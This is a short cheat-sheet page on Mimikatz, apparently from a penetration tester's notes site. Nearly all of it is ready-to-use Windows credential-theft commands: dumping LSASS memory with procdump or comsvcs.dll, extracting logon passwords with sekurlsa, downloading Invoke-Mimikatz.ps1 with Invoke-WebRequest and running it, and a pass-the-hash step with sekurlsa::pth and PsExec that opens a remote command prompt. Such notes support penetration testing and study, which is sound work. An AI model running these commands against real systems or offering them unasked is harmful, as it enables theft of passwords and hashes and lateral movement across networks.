---
layout: default
title: Mimikatz
tags:
    - certificates private keys
    - credentials
    - in memory
    - kerberos tickets
    - local security authority subsystem service
    - LSASS
    - pass-the-hash
    - passwords
    - procdump
    - windows
---
# Mimikatz
### Offline
#### Dump LSASS
```powershell
procdump.exe -ma lsass.exe <output path>  # use -r flag to avoid reading lsass by dumping a clone
.\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 <output path> full  # uses native comsvcs.dll
```
- Alternatively can use task manager (Processes > lsass.exe > Create Dump File)

#### Extracting Passwords
```shell
sekurlsa::minidump <dump path>
sekurlsa::logonpasswords
```

### On Target Machine
#### PowerShell Version ([Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1))
In-memory
```powershell
Invoke-WebRequest -UseBasicParsing <url> -Verbose
```

Save to disk
```powershell
Invoke-WebRequest -UseBasicParsing <url> -OutFile Invoke-Mimikatz.ps1 -Verbose
```

```powershell
Get-Help Invoke-Mimikatz
.\Invoke-Mimikatz -DumpCreds
```

#### Extracting Passwords
```shell
privilege:debug
sekurlsa::logonPasswords
```

#### Pass-the-Hash
```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>  # Hash from previous password extraction
PsExec.exe \\<domain> cmd.exe  # Spawn cmd prompt on given domain
```